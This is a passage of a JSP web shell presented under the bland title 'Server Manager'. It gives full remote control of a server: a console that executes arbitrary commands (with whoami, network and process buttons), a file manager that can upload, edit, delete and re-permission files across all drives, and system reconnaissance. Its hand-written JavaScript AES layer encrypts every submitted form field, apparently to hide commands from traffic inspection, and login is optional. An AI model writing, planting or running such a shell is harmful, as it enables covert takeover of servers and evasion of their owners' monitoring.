            function shiftRows(state) {
                var t = state[1]; state[1] = state[5]; state[5] = state[9]; state[9] = state[13]; state[13] = t;
                t = state[2]; state[2] = state[10]; state[10] = t; t = state[6]; state[6] = state[14]; state[14] = t;
                t = state[15]; state[15] = state[11]; state[11] = state[7]; state[7] = state[3]; state[3] = t;
            }
            function mixColumns(state) {
                function xtime(x) { return ((x << 1) ^ (((x >> 7) & 1) * 0x1b)) & 0xff; }
                for (var i = 0; i < 16; i += 4) {
                    var s0 = state[i], s1 = state[i + 1], s2 = state[i + 2], s3 = state[i + 3];
                    var t = s0 ^ s1 ^ s2 ^ s3;
                    state[i] ^= t ^ xtime(s0 ^ s1);
                    state[i + 1] ^= t ^ xtime(s1 ^ s2);
                    state[i + 2] ^= t ^ xtime(s2 ^ s3);
                    state[i + 3] ^= t ^ xtime(s3 ^ s0);
                }
            }
            function expandKey(key) {
                var keySchedule = key.slice();
                for (var i = 16; i < 176; i += 4) {
                    var t = keySchedule.slice(i - 4, i);
                    if (i % 16 === 0) {
                        t = [sbox[t[1]] ^ rcon[i / 16], sbox[t[2]], sbox[t[3]], sbox[t[0]]];
                    }
                    for (var j = 0; j < 4; j++) {
                        keySchedule[i + j] = keySchedule[i + j - 16] ^ t[j];
                    }
                }
                return keySchedule;
            }
            function encryptBlock(block, keySchedule) {
                var state = block.slice();
                addRoundKey(state, keySchedule.slice(0, 16));
                for (var round = 1; round < 10; round++) {
                    subBytes(state);
                    shiftRows(state);
                    mixColumns(state);
                    addRoundKey(state, keySchedule.slice(round * 16, (round + 1) * 16));
                }
                subBytes(state);
                shiftRows(state);
                addRoundKey(state, keySchedule.slice(160, 176));
                return state;
            }
            var keySchedule = expandKey(key);
            var paddedLength = Math.ceil((plaintext.length + 1) / 16) * 16;
            var padded = [];
            for (var i = 0; i < plaintext.length; i++) {
                padded.push(plaintext.charCodeAt(i));
            }
            var padValue = paddedLength - plaintext.length;
            for (var i = 0; i < padValue; i++) {
                padded.push(padValue);
            }
            var encrypted = iv.slice();
            var prevBlock = iv.slice();
            for (var i = 0; i < padded.length; i += 16) {
                var block = padded.slice(i, i + 16);
                for (var j = 0; j < 16; j++) {
                    block[j] ^= prevBlock[j];
                }
                var encBlock = encryptBlock(block, keySchedule);
                encrypted = encrypted.concat(encBlock);
                prevBlock = encBlock;
            }
            return encrypted;
        }
        
        function encodeBytes(data, encoding) {
            if (encoding.toLowerCase() === 'base32') {
                var base32Chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
                var result = '';
                var buffer = 0;
                var bitsLeft = 0;
                for (var i = 0; i < data.length; i++) {
                    buffer = (buffer << 8) | data[i];
                    bitsLeft += 8;
                    while (bitsLeft >= 5) {
                        result += base32Chars.charAt((buffer >> (bitsLeft - 5)) & 0x1F);
                        bitsLeft -= 5;
                    }
                }
                if (bitsLeft > 0) {
                    result += base32Chars.charAt((buffer << (5 - bitsLeft)) & 0x1F);
                }
                while (result.length % 8 !== 0) {
                    result += '=';
                }
                return result;
            } else if (encoding.toLowerCase() === 'hex') {
                return Array.from(data).map(function(b) {
                    return ('0' + (b & 0xFF).toString(16)).slice(-2);
                }).join('');
            } else {
                return btoa(String.fromCharCode.apply(null, data));
            }
        }
        
        function encryptAES(plaintext) {
            var keyBytes = deriveKey(ENCRYPTION_KEY);
            var iv = [];
            for (var i = 0; i < 16; i++) {
                iv.push(Math.floor(Math.random() * 256));
            }
            var encrypted = aesEncrypt(keyBytes, iv, plaintext);
            return encodeBytes(encrypted, ENCRYPTION_ENCODING);
        }
        
        function encryptFormData(formData) {
            var encrypted = new FormData();
            for (var pair of formData.entries()) {
                var encName = encryptAES(pair[0]);
                var encValue = encryptAES(pair[1]);
                encrypted.append(encName, encValue);
            }
            return encrypted;
        }
        
        document.addEventListener('submit', function(e) {
            if (!PARAM_ENCRYPTION_ENABLED) return true;
            var form = e.target;
            if (form.method.toUpperCase() !== 'POST') return true;
            
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            
            var formData = new FormData(form);
            var xhr = new XMLHttpRequest();
            var formAction = form.getAttribute('action');
            if (!formAction || formAction.indexOf('?') >= 0) {
                formAction = window.location.pathname;
            }
            xhr.open('POST', formAction, true);
            xhr.onload = function() {
                if (xhr.status === 200) {
                    document.open();
                    document.write(xhr.responseText);
                    document.close();
                }
            };
            
            if (form.enctype === 'multipart/form-data') {
                var encryptedFormData = new FormData();
                for (var pair of formData.entries()) {
                    if (pair[1] instanceof File) {
                        encryptedFormData.append(encryptAES('file'), pair[1]);
                    } else {
                        var encName = encryptAES(pair[0]);
                        var encValue = encryptAES(pair[1]);
                        encryptedFormData.append(encName, encValue);
                    }
                }
                xhr.send(encryptedFormData);
            } else {
                var encryptedData = encryptFormData(formData);
                var body = '';
                for (var pair of encryptedData.entries()) {
                    if (body.length > 0) body += '&';
                    body += encodeURIComponent(pair[0]) + '=' + encodeURIComponent(pair[1]);
                }
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                xhr.send(body);
            }
            return false;
        }, true);
    </script>
</body>
</html>
<%
    return;
}
%>
<%!
private boolean deleteRecursive(File file) {
    if (file.isDirectory()) {
        File[] children = file.listFiles();
        if (children != null) {
            for (File child : children) {
                if (!deleteRecursive(child)) {
                    return false;
                }
            }
        }
    }
    return file.delete();
}

private boolean setPermissions(File file, String perms) {
    try {
        boolean success = true;
        if (perms.length() >= 3) {
            char r = perms.charAt(0);
            char w = perms.charAt(1);
            char x = perms.charAt(2);
            
            if (r != 'r') success &= file.setReadable(false, false);
            if (r == 'r') success &= file.setReadable(true, false);
            if (w != 'w') success &= file.setWritable(false, false);
            if (w == 'w') success &= file.setWritable(true, false);
            if (x != 'x') success &= file.setExecutable(false, false);
            if (x == 'x') success &= file.setExecutable(true, false);
        }
        
        if (perms.length() == 9) {
            try {
                Path path = file.toPath();
                Set<PosixFilePermission> permissions = new HashSet<>();
                
                if (perms.charAt(0) == 'r') permissions.add(PosixFilePermission.OWNER_READ);
                if (perms.charAt(1) == 'w') permissions.add(PosixFilePermission.OWNER_WRITE);
                if (perms.charAt(2) == 'x') permissions.add(PosixFilePermission.OWNER_EXECUTE);
                if (perms.charAt(3) == 'r') permissions.add(PosixFilePermission.GROUP_READ);
                if (perms.charAt(4) == 'w') permissions.add(PosixFilePermission.GROUP_WRITE);
                if (perms.charAt(5) == 'x') permissions.add(PosixFilePermission.GROUP_EXECUTE);
                if (perms.charAt(6) == 'r') permissions.add(PosixFilePermission.OTHERS_READ);
                if (perms.charAt(7) == 'w') permissions.add(PosixFilePermission.OTHERS_WRITE);
                if (perms.charAt(8) == 'x') permissions.add(PosixFilePermission.OTHERS_EXECUTE);
                
                Files.setPosixFilePermissions(path, permissions);
                success = true;
            } catch (Exception e) {
            }
        }
        
        return success;
    } catch (Exception e) {
        return false;
    }
}
%>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Server Manager</title>
    <style>
        :root {
            --bg-primary: #ffffff;
            --bg-secondary: #f8f8f8;
            --bg-tertiary: #f0f0f0;
            --text-primary: #1a1a1a;
            --text-secondary: #666666;
            --text-tertiary: #999999;
            --border-color: #e0e0e0;
            --border-color-hover: #cccccc;
            --accent-color: #2c3e50;
            --accent-hover: #1a252f;
            --danger-color: #c0392b;
            --danger-hover: #a93226;
            --success-color: #27ae60;
            --success-hover: #229954;
            --success-bg: #eafaf1;
            --error-bg: #fff5f5;
            --error-border: #fc8181;
            --error-text: #c53030;
            --console-bg: #1e1e1e;
            --console-text: #d4d4d4;
        }
        [data-theme="dark"] {
            --bg-primary: #1a1a1a;
            --bg-secondary: #242424;
            --bg-tertiary: #2d2d2d;
            --text-primary: #e0e0e0;
            --text-secondary: #a0a0a0;
            --text-tertiary: #707070;
            --border-color: #404040;
            --border-color-hover: #555555;
            --accent-color: #4a5568;
            --accent-hover: #5a6578;
            --danger-color: #e74c3c;
            --danger-hover: #c0392b;
            --success-color: #27ae60;
            --success-hover: #229954;
            --success-bg: #1a3a2a;
            --error-bg: #3a2020;
            --error-border: #e53e3e;
            --error-text: #fc8181;
            --console-bg: #0a0a0a;
            --console-text: #d4d4d4;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif; background: var(--bg-secondary); color: var(--text-primary); transition: background 0.3s, color 0.3s; }
        .header { background: var(--bg-primary); border-bottom: 1px solid var(--border-color); padding: 12px 20px; }
        .header-content { max-width: 1400px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; }
        .header h1 { font-size: 16px; font-weight: 600; letter-spacing: -0.3px; }
        .header-actions { display: flex; gap: 8px; align-items: center; }
        .theme-toggle { background: var(--bg-tertiary); border: 1px solid var(--border-color); padding: 6px 10px; cursor: pointer; font-size: 12px; color: var(--text-primary); }
        .theme-toggle:hover { border-color: var(--border-color-hover); }
        .btn { padding: 6px 12px; background: var(--bg-tertiary); color: var(--text-primary); border: 1px solid var(--border-color); cursor: pointer; font-size: 12px; text-decoration: none; display: inline-block; font-weight: 500; }
        .btn:hover { border-color: var(--border-color-hover); background: var(--bg-secondary); }
        .btn-primary { background: var(--accent-color); color: white; border-color: var(--accent-color); }
        .btn-primary:hover { background: var(--accent-hover); border-color: var(--accent-hover); }
        .btn-danger { background: var(--danger-color); color: white; border-color: var(--danger-color); }
        .btn-danger:hover { background: var(--danger-hover); border-color: var(--danger-hover); }
        .btn-success { background: var(--success-color); color: white; border-color: var(--success-color); }
        .btn-success:hover { background: var(--success-hover); border-color: var(--success-hover); }
        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
        .tabs { display: flex; gap: 0; border-bottom: 1px solid var(--border-color); margin-bottom: 20px; }
        .tab { padding: 10px 20px; background: transparent; border: none; cursor: pointer; font-size: 13px; color: var(--text-secondary); border-bottom: 2px solid transparent; font-weight: 500; }
        .tab.active { color: var(--text-primary); border-bottom-color: var(--accent-color); }
        .tab:hover { color: var(--text-primary); }
        .panel { background: var(--bg-primary); padding: 20px; border: 1px solid var(--border-color); display: none; }
        .panel.active { display: block; }
        .message { padding: 12px; margin-bottom: 20px; border-left: 3px solid; font-size: 13px; }
        .message.success { background: var(--success-bg); border-color: var(--success-color); color: var(--text-primary); }
        .message.error { background: var(--error-bg); border-color: var(--error-border); color: var(--error-text); }
        .message.info { background: var(--bg-tertiary); border-color: var(--accent-color); color: var(--text-primary); }
        .message.console { background: var(--bg-tertiary); border-color: var(--border-color); color: var(--text-primary); white-space: pre-wrap; font-family: 'SF Mono', 'Monaco', 'Courier New', monospace; font-size: 12px; max-height: 500px; overflow-y: auto; }
        .message.file { background: var(--bg-primary); border-color: var(--border-color); color: var(--text-primary); white-space: pre; font-family: 'SF Mono', 'Monaco', 'Courier New', monospace; font-size: 11px; max-height: 600px; overflow: auto; }
        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; margin-bottom: 6px; font-weight: 500; font-size: 12px; color: var(--text-secondary); }
        .form-group input, .form-group textarea { width: 100%; padding: 8px; border: 1px solid var(--border-color); background: var(--bg-primary); color: var(--text-primary); font-size: 13px; font-family: inherit; }
        .form-group input:focus, .form-group textarea:focus { outline: none; border-color: var(--accent-color); }
        .form-group textarea { font-family: 'SF Mono', 'Monaco', 'Courier New', monospace; resize: vertical; min-height: 200px; }
        .breadcrumb { background: var(--bg-tertiary); padding: 10px 12px; margin-bottom: 15px; font-size: 12px; display: flex; align-items: center; gap: 10px; }
        .breadcrumb a { color: var(--accent-color); text-decoration: none; }
        .breadcrumb a:hover { text-decoration: underline; }
        .breadcrumb form { display: inline; }
        .file-list { border: 1px solid var(--border-color); overflow-x: auto; }
        .file-table { width: 100%; border-collapse: collapse; }
        .file-table th { background: var(--bg-tertiary); padding: 10px 12px; text-align: left; font-weight: 600; font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; border-bottom: 1px solid var(--border-color); white-space: nowrap; color: var(--text-secondary); }
        .file-table td { padding: 8px 12px; border-bottom: 1px solid var(--border-color); font-size: 12px; }
        .file-table tr:last-child td { border-bottom: none; }
        .file-table tr:hover { background: var(--bg-secondary); }
        .file-icon { font-size: 16px; width: 30px; text-align: center; }
        .file-name { font-weight: 500; word-break: break-word; }
        .file-name form { display: inline; }
        .file-name button { background: none; border: none; color: var(--text-primary); text-decoration: none; cursor: pointer; padding: 0; font: inherit; text-align: left; }
        .file-name button:hover { color: var(--accent-color); }
        .file-actions { display: flex; gap: 4px; flex-wrap: wrap; }
        .file-actions button { padding: 3px 8px; font-size: 11px; }
        .console-output { background: var(--console-bg); color: var(--console-text); padding: 15px; font-family: 'SF Mono', 'Monaco', 'Courier New', monospace; font-size: 12px; max-height: 500px; overflow-y: auto; white-space: pre-wrap; margin-top: 15px; border: 1px solid var(--border-color); }
        .console-output .command { color: #4ec9b0; }
        .console-output .error { color: #f48771; }
        .info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 15px; }
        .info-card { background: var(--bg-primary); padding: 15px; border: 1px solid var(--border-color); }
        .info-card h3 { margin-bottom: 12px; color: var(--accent-color); font-size: 13px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
        .info-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid var(--border-color); font-size: 12px; }
        .info-row:last-child { border-bottom: none; }
        .info-label { font-weight: 500; color: var(--text-secondary); }
        .info-value { color: var(--text-primary); text-align: right; word-break: break-word; }
        .console-input { display: flex; gap: 8px; margin-bottom: 15px; }
        .console-input input { flex: 1; }
        .form-row { display: flex; gap: 10px; }
        .form-row .form-group { flex: 1; }
        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); }
        .modal.active { display: flex; align-items: center; justify-content: center; }
        .modal-content { background: var(--bg-primary); padding: 24px; border: 1px solid var(--border-color); max-width: 600px; width: 90%; max-height: 80vh; overflow-y: auto; }
        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .modal-header h2 { margin: 0; font-size: 16px; font-weight: 600; }
        .modal-close { background: none; border: none; font-size: 24px; cursor: pointer; color: var(--text-tertiary); padding: 0; line-height: 1; }
        .modal-close:hover { color: var(--text-primary); }
        .toolbar { margin-bottom: 15px; display: flex; gap: 8px; flex-wrap: wrap; }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-content">
            <h1>Server Manager</h1>
            <div class="header-actions">
                <span style="opacity: 0.7; font-size: 12px;"><%= System.getProperty("user.name") %></span>
                <button class="theme-toggle" onclick="toggleTheme()">Theme</button>
                <% if (isAuthEnabled()) { %>
                <form method="POST" style="display: inline;">
                    <input type="hidden" name="action" value="logout">
                    <button type="submit" class="btn btn-danger">Logout</button>
                </form>
                <% } %>
            </div>
        </div>
    </div>
    
    <div class="container">
        <% if (!message.isEmpty()) { %>
        <div class="message <%= messageType %>"><%= escapeHtml(message) %></div>
        <% } %>
        
        <div class="tabs">
            <button class="tab active" onclick="switchTab('files')">File Manager</button>
            <button class="tab" onclick="switchTab('console')">Console</button>
            <button class="tab" onclick="switchTab('sysinfo')">System Info</button>
        </div>
        
        <div id="files-panel" class="panel active">
            <%
                File currentDir = new File(currentPath);
                if (!currentDir.exists() || !currentDir.isDirectory()) {
                    currentPath = System.getProperty("user.home");
                    currentDir = new File(currentPath);
                }
                currentPath = currentDir.getAbsolutePath();
                String homeDir = System.getProperty("user.home");
            %>
            
            <div class="breadcrumb">
                <form method="POST" style="display: inline;">
                    <input type="hidden" name="action" value="navigate">
                    <input type="hidden" name="navpath" value="<%= homeDir %>">
                    <input type="hidden" name="tab" value="files">
                    <button type="submit" class="btn btn-primary" style="padding: 4px 10px; font-size: 11px;">~</button>
                </form>
                <span style="color: var(--text-secondary);">|</span>
                <%
                String[] pathParts = currentPath.split(File.separator.equals("\\") ? "\\\\" : File.separator);
                StringBuilder pathBuilder = new StringBuilder();
                
                if (File.separator.equals("\\")) {
                %>
                    <form method="POST" style="display: inline;">
                        <input type="hidden" name="action" value="navigate">
                        <input type="hidden" name="navpath" value="">
                        <input type="hidden" name="tab" value="files">
                        <button type="submit" style="background: none; border: none; color: var(--accent-color); cursor: pointer; padding: 0; font: inherit;">Drives</button>
                    </form>
                <%
                    if (pathParts.length > 0 && !pathParts[0].isEmpty()) {
                        pathBuilder.append(pathParts[0]);
                %>
                        / <form method="POST" style="display: inline;">
                            <input type="hidden" name="action" value="navigate">
                            <input type="hidden" name="navpath" value="<%= escapeHtml(pathBuilder.toString()) %>">
                            <input type="hidden" name="tab" value="files">
                            <button type="submit" style="background: none; border: none; color: var(--accent-color); cursor: pointer; padding: 0; font: inherit;"><%= pathParts[0] %></button>
                        </form>
                <%
                        for (int i = 1; i < pathParts.length; i++) {
                            if (!pathParts[i].isEmpty()) {
                                pathBuilder.append(File.separator).append(pathParts[i]);
                %>
                                / <form method="POST" style="display: inline;">
                                    <input type="hidden" name="action" value="navigate">
                                    <input type="hidden" name="navpath" value="<%= escapeHtml(pathBuilder.toString()) %>">
                                    <input type="hidden" name="tab" value="files">
                                    <button type="submit" style="background: none; border: none; color: var(--accent-color); cursor: pointer; padding: 0; font: inherit;"><%= escapeHtml(pathParts[i]) %></button>
                                </form>
                <%
                            }
                        }
                    }
                } else {
                %>
                    <form method="POST" style="display: inline;">
                        <input type="hidden" name="action" value="navigate">
                        <input type="hidden" name="navpath" value="/">
                        <input type="hidden" name="tab" value="files">
                        <button type="submit" style="background: none; border: none; color: var(--accent-color); cursor: pointer; padding: 0; font: inherit;">Root</button>
                    </form>
                <%
                    for (int i = 0; i < pathParts.length; i++) {
                        if (!pathParts[i].isEmpty()) {
                            pathBuilder.append("/").append(pathParts[i]);
                %>
                            / <form method="POST" style="display: inline;">
                                <input type="hidden" name="action" value="navigate">
                                <input type="hidden" name="navpath" value="<%= escapeHtml(pathBuilder.toString()) %>">
                                <input type="hidden" name="tab" value="files">
                                <button type="submit" style="background: none; border: none; color: var(--accent-color); cursor: pointer; padding: 0; font: inherit;"><%= escapeHtml(pathParts[i]) %></button>
                            </form>
                <%
                        }
                    }
                }
                %>
            </div>
            
            <div class="toolbar">
                <button class="btn btn-primary" onclick="showModal('createDirModal')">New Folder</button>
                <button class="btn btn-primary" onclick="showModal('createFileModal')">New File</button>
                <button class="btn btn-success" onclick="showModal('uploadModal')">Upload</button>
            </div>
            
            <div class="file-list">
                <table class="file-table">
                    <thead>
                        <tr>
                            <th></th>
                            <th>Name</th>
                            <th>Extension</th>
                            <th>Size</th>
                            <th>Modified (UTC)</th>
                            <th>Permission</th>
                            <th>Owner</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                <%
                File[] roots = File.listRoots();
                SimpleDateFormat utcFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                utcFormat.setTimeZone(TimeZone.getTimeZone("UTC"));
                
                if (currentPath.isEmpty() || currentDir.getParent() != null) {
                    File parentDir = currentDir.getParentFile();
                    String parentPath = parentDir != null ? parentDir.getAbsolutePath() : "";
                    if (currentPath.isEmpty() && roots.length > 0) {
                        parentPath = "";
                    }
                %>
                        <tr>
                            <td class="file-icon">📁</td>
                            <td class="file-name">
                                <form method="POST" style="display: inline;">
                                    <input type="hidden" name="action" value="navigate">
                                    <input type="hidden" name="navpath" value="<%= escapeHtml(parentPath) %>">
                                    <input type="hidden" name="tab" value="files">
                                    <button type="submit">..</button>
                                </form>
                            </td>
                            <td>-</td>
                            <td>-</td>
                            <td>-</td>
                            <td>-</td>
                            <td>-</td>
                            <td>-</td>
                        </tr>
                <% } %>
                
                <%
                if (currentPath.isEmpty()) {
                    for (File root : roots) {
                        String rootPath = root.getAbsolutePath();
                %>
                        <tr>
                            <td class="file-icon">💾</td>
                            <td class="file-name">
                                <form method="POST" style="display: inline;">
                                    <input type="hidden" name="action" value="navigate">
                                    <input type="hidden" name="navpath" value="<%= escapeHtml(rootPath) %>">
                                    <input type="hidden" name="tab" value="files">
                                    <button type="submit"><%= escapeHtml(rootPath) %></button>
                                </form>
                            </td>
                            <td>-</td>
                            <td><%= formatBytes(root.getTotalSpace()) %></td>
                            <td>-</td>
                            <td>-</td>
                            <td>-</td>
                            <td>-</td>
                        </tr>
                <%
                    }
                } else {
                    List<File> files = listFiles(currentPath);
                    for (File file : files) {
                        String fileName = file.getName();
                        String filePath = file.getAbsolutePath();
                        boolean isDir = file.isDirectory();
                        long fileSize = file.length();
                        String permissions = getPosixPermissions(file.toPath());
                        String owner = getFileOwner(file.toPath());
                        String extension = isDir ? "-" : getFileExtension(fileName);
                        String lastModified = utcFormat.format(new Date(file.lastModified()));
                %>
                        <tr>
                            <td class="file-icon"><%= isDir ? "📁" : "📄" %></td>
                            <td class="file-name">
                                <% if (isDir) { %>
                                <form method="POST" style="display: inline;">
                                    <input type="hidden" name="action" value="navigate">
                                    <input type="hidden" name="navpath" value="<%= escapeHtml(filePath) %>">
                                    <input type="hidden" name="tab" value="files">
                                    <button type="submit"><%= escapeHtml(fileName) %></button>
                                </form>
                                <% } else { %>
                                <%= escapeHtml(fileName) %>
                                <% } %>
                            </td>
                            <td><%= escapeHtml(extension) %></td>
                            <td><%= isDir ? "-" : formatBytes(fileSize) %></td>
                            <td><%= lastModified %></td>
                            <td><%= permissions %></td>
                            <td><%= escapeHtml(owner) %></td>
                            <td>
                                <div class="file-actions">
                                    <% if (!isDir) { %>
                                    <button class="btn btn-primary" onclick="viewFile('<%= escapeHtml(filePath.replace("\\", "\\\\").replace("'", "\\'")) %>', '<%= escapeHtml(fileName.replace("\\", "\\\\").replace("'", "\\'")) %>')">View</button>
                                    <% } %>
                                    <button class="btn btn-primary" onclick="moveFile('<%= escapeHtml(filePath.replace("\\", "\\\\").replace("'", "\\'")) %>', '<%= escapeHtml(fileName.replace("\\", "\\\\").replace("'", "\\'")) %>')">Move</button>
                                    <form method="POST" style="display: inline;" onsubmit="return confirm('Delete <%= escapeHtml(fileName.replace("'", "\\'")) %>?');">
                                        <input type="hidden" name="action" value="delete">
                                        <input type="hidden" name="filepath" value="<%= escapeHtml(filePath) %>">
                                        <input type="hidden" name="path" value="<%= escapeHtml(currentPath) %>">
                                        <input type="hidden" name="tab" value="files">
                                        <button type="submit" class="btn btn-danger">Delete</button>
                                    </form>
                                </div>
                            </td>
                        </tr>
                <%
                    }
                }
                %>
                    </tbody>
                </table>
            </div>
        </div>
        
        <div id="console-panel" class="panel">
            <form method="POST" class="console-input">
                <input type="hidden" name="action" value="execute">
                <input type="hidden" name="path" value="<%= escapeHtml(currentPath) %>">
                <input type="hidden" name="tab" value="console">
                <input type="text" name="command" placeholder="Enter command..." autofocus>
                <button type="submit" class="btn btn-success">Execute</button>
                <button type="button" class="btn btn-danger" onclick="clearConsole()">Clear</button>
            </form>
            
            <%
            String osName = System.getProperty("os.name").toLowerCase();
            boolean isWindows = osName.contains("win");
            String listCmd = isWindows ? "dir" : "ls -la";
            String netCmd = isWindows ? "ipconfig" : "ifconfig";
            String procCmd = isWindows ? "tasklist" : "ps aux";
            %>
            <div style="background: var(--bg-tertiary); padding: 15px; border: 1px solid var(--border-color);">
                <h3 style="margin-bottom: 10px; font-size: 12px; font-weight: 600; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.5px;">Quick Commands</h3>
                <div style="display: flex; flex-wrap: wrap; gap: 8px;">
                    <button class="btn btn-primary" onclick="executeQuickCommand('pwd')">pwd</button>
                    <button class="btn btn-primary" onclick="executeQuickCommand('whoami')">whoami</button>
                    <button class="btn btn-primary" onclick="executeQuickCommand('date')">date</button>
                    <button class="btn btn-primary" onclick="executeQuickCommand('<%= listCmd %>')">list files</button>
                    <button class="btn btn-primary" onclick="executeQuickCommand('<%= netCmd %>')">network</button>
                    <button class="btn btn-primary" onclick="executeQuickCommand('<%= procCmd %>')">processes</button>
                </div>
            </div>
            
            <% if (consoleHistory != null && !consoleHistory.isEmpty()) { %>
            <div class="console-output"><%
                for (int i = 0; i < consoleHistory.size(); i++) {
                    String line = consoleHistory.get(i);
                    if (line.startsWith("$ ")) {
                        out.print("<div class='command'>" + escapeHtml(line) + "</div>");
                    } else if (line.contains("[ERROR]")) {
                        out.print("<div class='error'>" + escapeHtml(line) + "</div>");
                    } else {
                        out.print(escapeHtml(line));
                        if (i < consoleHistory.size() - 1) out.print("\n");
                    }
                }
            %></div>
            <% } %>
        </div>
        
        <div id="sysinfo-panel" class="panel">
            <div class="info-grid">
                <%
                Map<String, Object> sysInfo = getSystemInfo();
                Map<String, List<Map.Entry<String, Object>>> grouped = new LinkedHashMap<>();
                grouped.put("System", new ArrayList<Map.Entry<String, Object>>());
                grouped.put("Java", new ArrayList<Map.Entry<String, Object>>());
                grouped.put("Memory", new ArrayList<Map.Entry<String, Object>>());
                grouped.put("Storage", new ArrayList<Map.Entry<String, Object>>());
                grouped.put("User", new ArrayList<Map.Entry<String, Object>>());
                
                for (Map.Entry<String, Object> entry : sysInfo.entrySet()) {
                    String key = entry.getKey();
                    if (key.startsWith("OS") || key.equals("CPU Cores") || key.equals("Current Date")) {
                        grouped.get("System").add(entry);
                    } else if (key.startsWith("Java")) {
                        grouped.get("Java").add(entry);
                    } else if (key.contains("Memory")) {
                        grouped.get("Memory").add(entry);
                    } else if (key.startsWith("Disk")) {
                        grouped.get("Storage").add(entry);
                    } else if (key.startsWith("User")) {
                        grouped.get("User").add(entry);
                    }
                }
                
                for (Map.Entry<String, List<Map.Entry<String, Object>>> group : grouped.entrySet()) {
                    if (!group.getValue().isEmpty()) {
                %>
                <div class="info-card">
                    <h3><%= group.getKey() %></h3>
                    <% for (Map.Entry<String, Object> info : group.getValue()) { %>
                    <div class="info-row">
                        <span class="info-label"><%= info.getKey() %>:</span>
                        <span class="info-value"><%= info.getValue() %></span>
                    </div>
                    <% } %>
                </div>
                <% 
                    }
                }
                %>
            </div>
        </div>
    </div>
    
    <div id="createDirModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Create New Folder</h2>
                <button class="modal-close" onclick="hideModal('createDirModal')">&times;</button>
            </div>
            <form method="POST">
                <input type="hidden" name="action" value="createDir">
                <input type="hidden" name="path" value="<%= escapeHtml(currentPath) %>">
                <input type="hidden" name="tab" value="files">
                <div class="form-group">
                    <label>Folder Name:</label>
                    <input type="text" name="dirname" required autofocus>
                </div>
                <button type="submit" class="btn btn-primary">Create</button>
            </form>
        </div>
    </div>
    
    <div id="createFileModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Create New File</h2>
                <button class="modal-close" onclick="hideModal('createFileModal')">&times;</button>
            </div>
            <form method="POST">
                <input type="hidden" name="action" value="createFile">
                <input type="hidden" name="path" value="<%= escapeHtml(currentPath) %>">
                <input type="hidden" name="tab" value="files">
                <div class="form-group">
                    <label>File Name:</label>
                    <input type="text" name="filename" required autofocus>
                </div>
                <button type="submit" class="btn btn-primary">Create</button>
            </form>
        </div>
    </div>
    
    <div id="moveModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Move/Rename: <span id="moveFileName"></span></h2>
                <button class="modal-close" onclick="hideModal('moveModal')">&times;</button>
            </div>
            <form method="POST">
                <input type="hidden" name="action" value="move">
                <input type="hidden" name="path" value="<%= escapeHtml(currentPath) %>">
                <input type="hidden" name="tab" value="files">
                <input type="hidden" name="filepath" id="moveFilePath">
                <div class="form-group">
                    <label>New Path:</label>
                    <input type="text" name="newpath" id="moveNewPath" required>
                </div>
                <button type="submit" class="btn btn-primary">Move</button>
            </form>
        </div>
    </div>
    
    <div id="uploadModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Upload File</h2>
                <button class="modal-close" onclick="hideModal('uploadModal')">&times;</button>
            </div>
            <form method="POST" enctype="multipart/form-data">
                <input type="hidden" name="action" value="upload">
                <input type="hidden" name="uploadpath" value="<%= escapeHtml(currentPath) %>">
                <input type="hidden" name="path" value="<%= escapeHtml(currentPath) %>">
                <input type="hidden" name="tab" value="files">
                <div class="form-group">
                    <label>Select File:</label>
                    <input type="file" name="file" required>
                </div>
                <button type="submit" class="btn btn-success">Upload</button>
            </form>
        </div>
    </div>
    
    <div id="viewEditModal" class="modal">
        <div class="modal-content" style="max-width: 900px;">
            <div class="modal-header">
                <h2><span id="viewEditModalTitle">View File</span>: <span id="viewEditFileName"></span></h2>
                <button class="modal-close" onclick="hideModal('viewEditModal')">&times;</button>
            </div>
            <div id="viewEditContent">
                <div class="form-group">
                    <textarea id="viewEditFileContent" readonly style="min-height: 500px; font-size: 12px;"></textarea>
                </div>
                <div style="display: flex; gap: 8px; margin-top: 15px;">
                    <button type="button" class="btn btn-primary" onclick="enableEditing()">Edit</button>
                    <button type="button" class="btn" onclick="hideModal('viewEditModal')">Close</button>
                </div>
            </div>
            <form method="POST" id="viewEditForm" style="display: none;">
                <input type="hidden" name="action" value="write">
                <input type="hidden" name="path" value="<%= escapeHtml(currentPath) %>">
                <input type="hidden" name="tab" value="files">
                <input type="hidden" name="filepath" id="viewEditFilePath">
                <input type="hidden" name="content" id="viewEditFormContent">
                <div class="form-group">
                    <textarea id="viewEditFileContentEdit" style="min-height: 500px; font-size: 12px;"></textarea>
                </div>
                <div style="display: flex; gap: 8px; margin-top: 15px;">
                    <button type="button" class="btn btn-success" onclick="saveFileChanges()">Save</button>
                    <button type="button" class="btn btn-danger" onclick="discardChanges()">Discard</button>
                </div>
            </form>
        </div>
    </div>
    
    <div id="chmodModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Change Permissions</h2>
                <button class="modal-close" onclick="hideModal('chmodModal')">&times;</button>
            </div>
